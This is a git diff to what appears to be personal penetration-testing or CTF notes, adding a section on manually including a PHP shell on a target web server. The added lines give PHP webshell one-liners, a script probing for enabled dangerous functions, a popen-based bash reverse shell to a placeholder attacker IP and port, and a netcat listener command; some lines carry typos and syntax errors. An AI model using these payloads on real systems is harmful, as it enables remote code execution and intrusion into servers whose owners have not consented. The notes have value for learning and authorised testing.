@@ -1,4 +1,4 @@
-### Proedures
+### Procedures
 
 #### Recon
 
@@ -55,5 +55,55 @@ tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
 ```
 
 ##### Interesting Tools
-OSINT
+OSINT (Open Source Intelligence Tools)
+
 - GitTools - https://github.com/internetwache/GitTools
+-------------------------
+
+##### manual inclusion of php shell
+
+<?php system("whoami"); ?>
+
+<?php phpinfo(); ?> # check if system / popen mods are disabled
+
+if so dfunction bypass so we create a nice php file which we include in a request to map what we can do as followws
+
+dangerous.php
+
+<?php 
+$dangerous_functions = array('popen','system');
+
+foreach($dangerous_functions as $f) {
+    if (function_exists($f)) {
+        echo $f . " exists<br>\n";
+    }
+}
+
+So output came with popen as a nice possibility
+
+so ... as a reference here is php popen manual :D --> https://www.php.net/manual/en/function.popen.php
+so we did some mods :D as follows below
+
+<?php
+error_reporting(E_ALL);
+
+/* Add redirection so we can get stderr. */
+$handle = popen('bash -c "bash -i > & /dev/tcp/<OUR_IP>/<OUR_PORT> 0>&1"'>, 'r');
+
+/* example $handle = popen('bash -c "bash -i > & /dev/tcp/127.0.0.1/9001 0>&1"'>, 'r'); */
+
+echo "'handle'; " . gettype($handle) . "\n";
+$read = fread($handle, 2096);
+echo $read;
+pclose($handle);
+
+?>
+
+
+we start our server that will reverse the shell using netcat as follows:
+
+nv -lvnp 9001
+
+when we have the server listening on this shell we send the request with our crafted shell and load it
+
+we should have droped to the shell on target server on the nc shell
